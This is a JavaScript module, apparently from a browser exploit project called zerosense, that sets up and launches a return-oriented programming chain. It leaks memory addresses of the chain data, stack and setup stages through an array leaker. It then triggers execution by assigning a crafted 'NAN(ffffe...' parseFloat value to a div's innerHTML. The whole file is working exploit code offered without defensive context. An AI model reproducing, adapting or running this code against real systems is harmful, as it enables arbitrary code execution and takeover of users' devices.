/*eslint-disable no-param-reassign */

var Util = require('zerosense/Util');

var trigger = document.body.appendChild(document.createElement("div"));

class Chain {
	
	constructor(cb) {
		this.cb = cb;
		
		this.addrChainStart = 0;
	}
	
	///////////////////////////////////////
	// Public: Chain
	///////////////////////////////////////
	
	getChain() {
		return this.cb.getChain();
	}
	
	
	///////////////////////////////////////
	// Public: Data
	///////////////////////////////////////
	
	getData() {
		return this.cb.getData();
	}
	
	getDataOffset(id) {
		return this.cb.getDataOffset(id);
	}
	
	getDataInt32(id) {
		var str = this.cb.getData().substr(this.cb.getDataOffset(id) / 2, 0x4 / 2);
		return Util.getint32(str);
	}
	
	getDataInt64(id) {
		var strHigh = this.cb.getData().substr(this.cb.getDataOffset(id) / 2, 0x4 / 2);
		var strLow = this.cb.getData().substr(this.cb.getDataOffset(id) / 2 + 2, 0x4 / 2);
		return { high: Util.getint32(strHigh), low: Util.getint32(strLow) };
	}
	
	
	///////////////////////////////////////
	// Private: Chain handling
	///////////////////////////////////////
	
	setup2Make(addr) {
		return Util.pad(0x30)
			+ Util.int32(addr);
	}
	
	setup1Make(addr) {		
		return Util.int32(addr);
	}
	
	prepare(arrayLeaker) {
		var i = 10;
	
		var addrData = arrayLeaker.setAndGetAddress(i++, this.cb.getData());
		if (addrData === null) {
			throw new Error("Failed to get chain data address.");
		}
		logger.debug(`Found chain data at 0x${addrData.toString(16)}`);
		this.cb.updateDataAddress(addrData);
		
		var addrStack = arrayLeaker.setAndGetAddress(i++, this.cb.getChain());
		if (addrStack === null) {
			throw new Error("Failed to get chain stack address.");
		}
		logger.debug(`Found chain stack at 0x${addrStack.toString(16)}`);
		var chainStackOffset = 0x4;
		
		var setup2 = this.setup2Make(addrStack + chainStackOffset);
		var addrSetup2 = arrayLeaker.setAndGetAddress(i++, setup2);
		if (addrSetup2 === null) {
			throw new Error("Failed to get setup2 address.");
		}
		logger.debug(`Found setup2 at 0x${addrSetup2.toString(16)}`);
		
		var setup1 = this.setup1Make(addrSetup2);
		var addrSetup1 = arrayLeaker.setAndGetAddress(i++, setup1);
		if (addrSetup1 === null) {
			throw new Error("Failed to get setup1 address.");
		}
		logger.debug(`Found setup1 at 0x${addrSetup1.toString(16)}`);
		
		this.addrChainStart = addrSetup1;
		logger.debug(`Chain start at 0x${this.addrChainStart.toString(16)}`);
	}
	
	execute() {
		if (this.addrChainStart === 0) {
			throw new Error("addrChainStart is null");
		}
		
		logger.debug(`Starting chain at 0x${this.addrChainStart.toString(16)}`);
		trigger.innerHTML = -parseFloat("NAN(ffffe" + this.addrChainStart.toString(16));
	}
	
}

module.exports = Chain;